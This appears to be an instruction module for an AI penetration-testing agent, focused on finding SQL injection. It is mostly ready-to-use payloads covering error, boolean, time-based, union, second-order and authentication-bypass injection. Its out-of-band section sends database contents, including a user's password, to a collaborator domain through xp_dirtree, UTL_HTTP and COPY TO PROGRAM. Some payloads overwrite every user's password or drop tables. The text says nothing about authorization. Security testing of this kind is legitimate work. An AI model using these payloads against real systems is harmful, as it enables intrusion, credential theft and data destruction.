## ACTIVE FOCUS MODE: SQL Injection — All Variants

Your SOLE objective this run is to find **SQL Injection vulnerabilities** in every form: Error-based, Union-based, Boolean-based Blind, Time-based Blind, Out-of-Band, and Second-Order SQLi.

---

### Step 1: Surface Mapping
Identify every injection surface before testing:
- **URL query parameters**: `?id=1`, `?search=foo`, `?sort=name`
- **Path segments**: `/user/1/profile`, `/products/electronics`
- **POST body fields**: form fields and JSON/XML body parameters
- **HTTP headers**: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`, `Cookie` values, `Accept-Language`
- **JSON body fields**: every string and integer value in API request bodies
- **GraphQL**: query arguments, fragment variables
- Prioritize parameters that look like they query a database: `id`, `user`, `name`, `search`, `q`, `filter`, `sort`, `order`, `page`, `category`, `type`, `status`.

---

### Step 2: Error-Based Detection
Use `fuzz_parameter` on every surface with these error-trigger probes:
- `'` (single quote), `''` (two single quotes), `"` (double quote), `` ` `` (backtick)
- `1'`, `1"`, `1\`, `1;`, `1/*`, `1--`, `1#`
- Boolean falsification: `1 AND 1=2`, `1' AND '1'='2`

Use `search_in_response` on results to detect SQL error keywords:
- **MySQL**: `You have an error in your SQL syntax`, `mysql_num_rows`, `mysql_fetch`
- **PostgreSQL**: `pg_query`, `unterminated quoted string`, `ERROR:  syntax error`
- **MSSQL**: `Unclosed quotation mark`, `Incorrect syntax near`, `ODBC SQL Server Driver`
- **Oracle**: `ORA-01756`, `ORA-00907`, `quoted string not properly terminated`
- **SQLite**: `SQLITE_ERROR`, `unrecognized token`, `near "...": syntax error`
- **Generic**: `syntax error`, `unexpected end of SQL command`, `DB Error`

A distinctive error on `'` but not `''` = high confidence SQLi.

---

### Step 3: Boolean-Based Blind SQLi
When errors are suppressed, test logical differences:
- True condition: `1' AND 1=1--`, `1 AND 1=1`, `' OR 'a'='a`
- False condition: `1' AND 1=2--`, `1 AND 1=2`, `' OR 'a'='b`
- Compare response **body length, content, status code** between true and false conditions using `interesting_results` from `fuzz_parameter`.
- A consistent difference (e.g., item appears vs disappears, length changes by >50 chars) = Boolean-blind SQLi confirmed.
- Extract data character-by-character: `1' AND SUBSTRING(database(),1,1)='a'--` → `'b'`, `'c'`... until match.
- For JSON APIs: `{"id": "1 AND 1=1"}` vs `{"id": "1 AND 1=2"}` — compare responses.

---

### Step 4: Time-Based Blind SQLi
When no observable difference exists in responses, use timing:
- **MySQL/MariaDB**: `1' AND SLEEP(5)--`, `1; SELECT SLEEP(5)--`, `1' AND BENCHMARK(5000000,SHA1(1))--`
- **PostgreSQL**: `1'; SELECT pg_sleep(5)--`, `1' AND 1=1 AND pg_sleep(5)--`
- **MSSQL**: `1'; WAITFOR DELAY '0:0:5'--`, `1' AND 1=1 WAITFOR DELAY '0:0:5'--`
- **Oracle**: `1' AND 1=dbms_pipe.receive_message('a',5)--`, `1'||dbms_pipe.receive_message('RDS$SESSION_INFO',5)--`
- **SQLite**: `1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--`
- Use `fuzz_parameter` with the baseline and a timed payload; check `interesting_results` for responses with significantly higher elapsed time.
- Confirm: re-run the same timed payload **twice** to rule out server-side slowness. Both should be delayed consistently.

---

### Step 5: Union-Based SQLi
If error messages show the injection point, determine column count and data types:
- Column count: `' ORDER BY 1--`, `' ORDER BY 2--`, ... until an error occurs.
- Data type probe: `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL--`
- Confirm string column: `' UNION SELECT 'a',NULL,NULL--`, `' UNION SELECT NULL,'a',NULL--`
- Extract data:
  - **MySQL**: `' UNION SELECT table_name,NULL FROM information_schema.tables--`
  - **PostgreSQL**: `' UNION SELECT table_name,NULL FROM information_schema.tables--`
  - **MSSQL**: `' UNION SELECT table_name,NULL FROM information_schema.tables--`
  - **Oracle**: `' UNION SELECT table_name,NULL FROM all_tables--`
  - **SQLite**: `' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--`
- Use `search_in_response` on the response to find injected data returned in the page.

---

### Step 6: Out-of-Band (OOB) SQLi
For blind SQLi with no timing or boolean differences:
- Call `generate_oob_payload` to get a collaborator domain (`{{oob_domain}}`).
- **MySQL**: `1' AND LOAD_FILE(CONCAT('\\\\',version(),'.{{oob_domain}}\\a'))--`
  Or: `1'; SELECT ... INTO OUTFILE '\\\\{{oob_domain}}\\share\\out'--`
- **MSSQL**: `1'; exec master..xp_dirtree '//{{oob_domain}}/a'--`
  Or: `1'; DECLARE @p VARCHAR(1024); SET @p=(SELECT password FROM users WHERE id=1); exec('master..xp_dirtree ''//'+@p+'.{{oob_domain}}/a''')`
- **PostgreSQL**: `1'; COPY (SELECT '') TO PROGRAM 'nslookup {{oob_domain}}'--`
- **Oracle**: `1' AND (SELECT UTL_HTTP.REQUEST('http://{{oob_domain}}/') FROM DUAL) IS NOT NULL--`
  Or: `1' UNION SELECT UTL_HTTP.REQUEST('http://{{oob_domain}}/'||user) FROM DUAL--`
- After 5-10 s, call `poll_collaborator`. A DNS/HTTP callback confirms blind OOB SQLi.

---

### Step 7: Second-Order (Stored) SQLi
Second-order SQLi occurs when user input is stored safely, but later **used unsafely in a different SQL query** triggered by another action.
- **Identify storage points**: registration forms (username, display name, profile fields), settings pages, address books, order descriptions, support tickets, comments.
- **Submit** a raw SQL payload without quoting: `admin'--`, `' OR 1=1--`, `test' AND SLEEP(5)--`
- **Trigger retrieval**: perform the action that reads the stored data back into a query — log in as the user, view the profile, change password, generate a report, search by the stored field.
- Use `search_in_response` to detect errors or behavioral differences when the payload is retrieved.
- Test specifically:
  - Register with username `admin'--` → attempt password change → does it change admin's password?
  - Register with username `' OR 1=1#` → trigger a search/lookup → does it return all records?
  - Submit a support ticket body containing `'; UPDATE users SET password='hacked'WHERE '1'='1` → check if it executes when staff views the ticket.

---

### Step 8: SQLi in Non-Standard Locations
- **Cookie injection**: modify session or tracking cookie values to contain SQLi payloads.
- **HTTP header injection**: `User-Agent: ' OR 1=1--`, `X-Forwarded-For: 1.1.1.1' OR 1=1--` — common in logging queries.
- **XML/SOAP bodies**: inject into `<value>` elements: `<id>1' OR '1'='1</id>`.
- **JSON operators in MongoDB**: test both SQL and NoSQL injection patterns if the API uses ORM that bridges both.
- **Search with operators**: `search=foo' UNION SELECT ...`, `sort=name; DROP TABLE--`
- **Batch/multi-query**: `1; SELECT sleep(5)--` (stacked queries, MSSQL/PostgreSQL only).

---

### Step 9: Authentication Bypass via SQLi
- Login form username: `admin'--`, `' OR '1'='1'--`, `' OR 1=1--`, `admin'/*`, `') OR ('1'='1`
- Login form password: `anything' OR '1'='1`, `anything' OR 1=1--`
- Test combinations — username: `admin'--`, password: (anything).
- Check if the resulting query structure bypasses the WHERE clause comparison.

---

### Reporting Rules
- Call `report_vulnerability` only for **confirmed** SQLi findings.
- Severity guide:
  - Union-based with data extraction = Critical
  - Time-based blind confirmed = High
  - OOB callback confirming blind SQLi = High
  - Error-based with error message leaking data = High
  - Boolean-blind confirmed = High
  - Second-order SQLi with demonstrated impact = High/Critical
  - Authentication bypass via SQLi = Critical
- INCIDENTAL FINDINGS RULE: Any non-SQLi anomaly MUST be added to `additional_findings` in `finish_run` as a structured entry. Examples: XSS reflection (Medium/High), CORS * (Low), missing security headers (Low), IDOR indicators (Medium).
- Always end the run by calling `finish_run`. Never write a plain-text conclusion.
